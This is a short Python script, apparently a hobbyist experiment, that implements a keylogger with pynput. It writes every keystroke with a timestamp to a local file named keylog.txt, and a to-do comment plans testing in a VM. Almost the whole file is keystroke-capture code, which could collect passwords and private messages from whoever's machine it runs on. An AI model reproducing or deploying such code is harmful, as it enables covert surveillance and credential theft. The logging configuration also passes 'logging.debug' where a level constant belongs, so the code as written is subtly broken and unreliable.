import logging
from pynput.keyboard import Key, Listener


logging.basicConfig(
  filename="keylog.txt", 
  datefmt="%m/%d/%Y %I:%M:%S %p", 
  format="%(asctime)s: %(message)s",
  level=logging.debug
  )

def on_press(key):
  logging.info(str(key))

with Listener(on_press=on_press) as listener:
  listener.join()


#To-Do:
# Set up VM & test this lol

# https://pynput.readthedocs.io/en/latest/keyboard.html

